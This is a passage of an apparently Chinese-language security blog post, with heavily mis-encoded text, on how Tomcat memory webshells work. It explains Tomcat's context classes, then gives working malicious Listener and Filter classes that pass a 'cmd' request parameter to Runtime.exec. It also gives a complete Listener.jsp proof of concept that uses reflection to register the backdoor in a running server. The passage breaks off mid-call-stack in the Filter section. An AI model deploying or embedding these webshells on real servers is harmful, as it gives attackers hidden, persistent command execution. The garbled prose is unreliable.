æ­¤Contextå¯ä»¥ç”¨æ¥ä¿å­˜ä¸€ä¸ªWebåº”ç”¨ä¸­å¤šä¸ªServletçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312147565.png" alt="image-20230131214733513"></p><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>Servletè§„èŒƒä¸­è§„å®šäº†ä¸€ä¸ªServletContextæ¥å£ï¼Œå…¶ç”¨æ¥ä¿å­˜ä¸€ä¸ªWebåº”ç”¨ä¸­æ‰€æœ‰Servletçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼Œèƒ½å¯¹Servletä¸­çš„å„ç§èµ„æºè¿›è¡Œè®¿é—®ã€æ·»åŠ ã€åˆ é™¤ç­‰ã€‚å…¶åœ¨Javaä¸­çš„å…·ä½“å®ç°æ˜¯<code>javax.servlet.ServletContext</code>æ¥å£</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>åœ¨Tomcatä¸­ï¼ŒServletContextæ¥å£çš„å…·ä½“å®ç°å°±æ˜¯ApplicationContextç±»ï¼Œå…¶å®ç°äº†ServletContextæ¥å£ä¸­å®šä¹‰çš„ä¸€äº›æ–¹æ³•ã€‚</p><p>Tomcatè¿™é‡Œä½¿ç”¨äº†<code>é—¨é¢æ¨¡å¼</code>ï¼Œå¯¹<code>ApplicationContext</code>ç±»è¿›è¡Œäº†å°è£…ï¼Œæˆ‘ä»¬è°ƒç”¨<code>getServletContext()</code>æ–¹æ³•è·å¾—çš„å…¶å®æ˜¯<code>ApplicationContextFacade</code>ç±»(é—¨é¢ç±»)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ApplicationContextFacade</span><span class="hljs-params">(ApplicationContext context)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.context = context;<span class="hljs-comment">//contextçš„ä¼ é€’</span><br> <br>        classCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        objectCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>        initClassCache();<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>ApplicationContextFacade</code>ç±»æ–¹æ³•ä¸­éƒ½ä¼šè°ƒç”¨this.contextç›¸åº”çš„æ–¹æ³•ï¼Œå› æ­¤æœ€ç»ˆè°ƒç”¨çš„è¿˜æ˜¯<code>ApplicationContext</code>ç±»çš„æ–¹æ³•ã€‚</p><blockquote><p>é—¨é¢æ¨¡å¼å¯ä»¥ç®€å•åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:å­ç³»ç»Ÿã€é—¨é¢(Facade)ã€å®¢æˆ·ç«¯</p><p>å®¢æˆ·ç«¯å¯ä»¥é€šè¿‡è°ƒç”¨é—¨é¢æ–¹æ³•è¿›è€Œè°ƒç”¨é›†æˆçš„å­ç³»ç»Ÿæ–¹æ³•ï¼Œä»¥åŒ»é™¢ç±»æ¯”ï¼Œå®¢æˆ·ç«¯ç›¸å½“äºç—…äººï¼Œé—¨é¢ç›¸å½“äºæ¥å¾…å‘˜ï¼Œè€Œå­ç³»ç»Ÿæ˜¯åŒ»é™¢å†…éƒ¨ç»†åŒ–çš„å„éƒ¨é—¨ã€‚</p></blockquote><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>org.apache.catalina.core.StandardContext</code>æ˜¯å­å®¹å™¨<code>Context</code>çš„æ ‡å‡†å®ç°ç±»ï¼Œå…¶ä¸­åŒ…å«äº†å¯¹Contextå­å®¹å™¨ä¸­èµ„æºçš„å„ç§æ“ä½œã€‚</p><p><code>ApplicationContext</code>ä¸­çš„è®¸å¤šæ–¹æ³•å®é™…ä¸Šè¿˜æ˜¯è°ƒç”¨äº†<code>StandardContext</code>ä¸­çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationContext</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletContext</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StandardContext context;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequestCharacterEncoding</span><span class="hljs-params">()</span> &#123;<br>          <span class="hljs-keyword">return</span> context.getRequestCharacterEncoding();<br>      &#125;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312219609.png" alt="image-20230131221926469"></p><blockquote><p>å¯ä»¥çœ‹å‡ºæˆ‘ä»¬å¯¹Contextå®¹å™¨ä¸­å„ç§èµ„æºè¿›è¡Œæ“ä½œæ—¶ï¼Œæœ€ç»ˆè°ƒç”¨çš„è¿˜æ˜¯StandardContextä¸­çš„æ–¹æ³•ï¼Œå› æ­¤StandardContextæ˜¯Tomcatä¸­è´Ÿè´£ä¸åº•å±‚äº¤äº’çš„Contextã€‚</p></blockquote><h2 id="0x01-Tomcatå†…å­˜é©¬"><a href="#0x01-Tomcatå†…å­˜é©¬" class="headerlink" title="0x01 Tomcatå†…å­˜é©¬"></a>0x01 Tomcatå†…å­˜é©¬</h2><p>Tomcatå†…å­˜é©¬å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ†åˆ«æ˜¯Listenerå‹ã€Filterå‹ã€Servletå‹,Tomcatå†…å­˜é©¬çš„æ ¸å¿ƒåŸç†å°±æ˜¯åŠ¨æ€åœ°å°†æ¶æ„ç»„ä»¶æ·»åŠ åˆ°æ­£åœ¨è¿è¡Œçš„TomcatæœåŠ¡å™¨ä¸­ã€‚</p><p>è¿™ä¾èµ–äºå®˜æ–¹å¯¹Servlet3.0çš„å‡çº§ï¼ŒServletåœ¨3.0ç‰ˆæœ¬ä¹‹åèƒ½å¤Ÿæ”¯æŒåŠ¨æ€æ³¨å†Œç»„ä»¶ã€‚è€ŒTomcatç›´åˆ°7.xæ‰æ”¯æŒServlet3.0ï¼Œä¸ºæ–¹ä¾¿è°ƒè¯•ï¼Œå…ˆåŠ å…¥Tomcatä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>10.0.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ç‰ˆæœ¬ä¸æœ¬æœºtomcatåŒ¹é…ï¼Œtomcat10åæŠŠå¾ˆå¤šå¸¸ç”¨ç±»çš„ä½ç½®éƒ½æ”¹äº†</p></blockquote><h3 id="Listenerå‹"><a href="#Listenerå‹" class="headerlink" title="Listenerå‹"></a>Listenerå‹</h3><p>ç›®æ ‡å°±æ˜¯åœ¨æœåŠ¡å™¨ä¸­åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ¶æ„çš„Listenerã€‚</p><p>è€ŒListeneræ ¹æ®äº‹ä»¶æºçš„ä¸åŒï¼Œå¤§è‡´å¯ä»¥åˆ†ä¸ºå¦‚ä¸‹ä¸‰ç§</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><blockquote><p><code>ServletRequestListener</code>ç”¨äºç›‘å¬<code>ServletRequest</code>å¯¹è±¡ï¼Œå½“æˆ‘ä»¬è®¿é—®ä»»æ„èµ„æºæ—¶ï¼Œéƒ½ä¼šè§¦å‘<code>ServletRequestListener#requestInitialized()</code>æ–¹æ³•</p></blockquote><p>åˆ›å»ºä¸€ä¸ªServleté¡¹ç›®å®ç°æ¶æ„Listener,ç›®å½•é…ç½®â¬‡ï¸</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010141228.png" alt="image-20230201014157169"></p><p>shell_Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>        String cmd=request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®ä»»æ„ç›®å½•å¯ä»¥æ‰§è¡Œå‘½ä»¤</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010146200.png" alt="image-20230201014602139"></p><blockquote><p>æ¥ä¸‹æ¥åªè¦å°†æ¶æ„ListeneråŠ¨æ€æ³¨å†Œè¿›æœåŠ¡å™¨</p></blockquote><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>è°ƒç”¨æ ˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">requestInitialized:<span class="hljs-number">13</span>, shell_Listener (Listener)<br>fireRequestInitEvent:<span class="hljs-number">5992</span>, StandardContext (org.apache.catalina.core)<br>invoke:<span class="hljs-number">121</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>StandardContext#fireRequestInitEvent</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">fireRequestInitEvent</span><span class="hljs-params">(ServletRequest request)</span> &#123;<br>        Object instances[] = getApplicationEventListeners();<span class="hljs-comment">//è·å–Listeneræ•°ç»„</span><br>        <span class="hljs-keyword">if</span> ((instances != <span class="hljs-literal">null</span>) &amp;&amp; (instances.length &gt; <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-type">ServletRequestEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestEvent</span>(getServletContext(), request);<br>            <span class="hljs-keyword">for</span> (Object instance : instances) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!(instance <span class="hljs-keyword">instanceof</span> ServletRequestListener)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">listener</span> <span class="hljs-operator">=</span> (ServletRequestListener) instance;<br> <br>                <span class="hljs-keyword">try</span> &#123;<br>                    listener.requestInitialized(event);<span class="hljs-comment">//éå†è§¦å‘æ•°ç»„å†…å„Listenerçš„requestInitializedæ–¹æ³•</span><br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.requestListener.requestInit&quot;</span>,<br>                            instance.getClass().getName()), t);<br>                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›ç¬¬ä¸€è¡Œçš„<code>getApplicationEventListeners()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;Object&gt; applicationEventListenersList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>();<span class="hljs-comment">//å­˜å‚¨é‡ŒListener</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">public</span> Object[] getApplicationEventListeners() &#123;<br>    <span class="hljs-keyword">return</span> applicationEventListenersList.toArray();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010157913.png" alt="image-20230201015745831"></p><p><code>StandardContext</code>ä¹Ÿå®šä¹‰ç±»æ·»åŠ Listenerçš„æ–¹æ³•,é‚£ä¹ˆæˆ‘ä»¬ä¸ºäº†æ³¨å†Œæ¶æ„Listenerï¼Œå°±å¿…é¡»å…ˆè·å–<code>StandardContext</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addApplicationEventListener</span><span class="hljs-params">(Object listener)</span> &#123;<br>        applicationEventListenersList.add(listener);<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="è·å–StandardContextç±»"><a href="#è·å–StandardContextç±»" class="headerlink" title="è·å–StandardContextç±»"></a>è·å–StandardContextç±»</h4><p>åœ¨<code>StandardHostValve#invoke</code>ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å…¶é€šè¿‡requestå¯¹è±¡æ¥è·å–<code>StandardContext</code>ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Request request, Response response)</span><span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>    <span class="hljs-comment">// Select the Context to be used for this Request</span><br>    <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> request.getContext();<br></code></pre></td></tr></table></figure><p>JSPå†…ç½®äº†requestå¯¹è±¡,å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„è·å–</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åˆ©ç”¨ç±»åŠ è½½å™¨</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();<br>%&gt;<br></code></pre></td></tr></table></figure><p>å†æ·»åŠ ä¸€ä¸‹ä¸Šé¢å†™çš„æ¶æ„Listener</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%<br><span class="hljs-type">shell_Listener</span> <span class="hljs-variable">shell_listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">shell_Listener</span>();<br>  context.addApplicationEventListener(shell_listener);<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="å®Œæ•´POC"><a href="#å®Œæ•´POC" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><p>Listener.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br> <br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>           <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>           <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-keyword">try</span> &#123;<br>                   Runtime.getRuntime().exec(cmd);<br>               &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                   e.printStackTrace();<br>               &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                   n.printStackTrace();<br>               &#125;<br>            &#125;<br>        &#125;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br> <br>    <span class="hljs-type">Shell_Listener</span> <span class="hljs-variable">shell_Listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shell_Listener</span>();<br>    context.addApplicationEventListener(shell_Listener);<br>%&gt;<br></code></pre></td></tr></table></figure><p>æµ‹è¯•å‰ï¼Œå…ˆå°†ä¹‹å‰çš„Listeneråˆ é™¤ï¼Œå…ˆç›´æ¥å°è¯•å‘½ä»¤æ‰§è¡Œï¼Œå‘ç°å¼¹è®¡ç®—å™¨å¤±è´¥ï¼Œå†è®¿é—®ä¸€ä¸‹Listener.jsp</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010211631.png" alt="image-20230201021155544"></p><p>æ­¤æ—¶Shell_Listenerå·²ç»è¢«åŠ è½½è¿›æœåŠ¡å™¨ï¼Œå†æ¬¡å°è¯•å¼¹è®¡ç®—å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010212384.png" alt="image-20230201021249301"></p><h3 id="Filterå‹"><a href="#Filterå‹" class="headerlink" title="Filterå‹"></a>Filterå‹</h3><p>ä»¿ç…§Listenerçš„æ€è·¯ï¼Œå®ç°ä¸€ä¸ªæ¶æ„Filterã€‚Filterçš„è°ƒç”¨æ˜¯é€šè¿‡FilterChainå®ç°çš„ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010214825.png" alt="image-20230201021445758"></p><blockquote><p>åªè¦é‡å†™doFilteræ–¹æ³•å³å¯</p></blockquote><p>æ¶æ„Filter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-meta">@WebFilter(&quot;/*&quot;)</span> <span class="hljs-comment">//åº”ç”¨åˆ°æ‰€æœ‰è·¯ç”±</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shell_Filter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException | NullPointerException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010219311.png" alt="image-20230201021930234"></p><h4 id="Filterè°ƒç”¨åˆ†æ"><a href="#Filterè°ƒç”¨åˆ†æ" class="headerlink" title="Filterè°ƒç”¨åˆ†æ"></a>Filterè°ƒç”¨åˆ†æ</h4><p>è°ƒç”¨æ ˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">doFilter:<span class="hljs-number">11</span>, Shell_Filter (Filter)<br>internalDoFilter:<span class="hljs-number">189</span>, ApplicationFilterChain (org.apache.catalina.core)<br>doFilter:<span class="hljs-number">162</span>, ApplicationFilterChain (org.apache.catalina.core)<br>invoke:<span class="hljs-number">197</span>, StandardWrapperValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">97</span>, StandardContextValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">540</span>, AuthenticatorBase (org.apache.catalina.authenticator)<br>invoke:<span class="hljs-number">135</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span 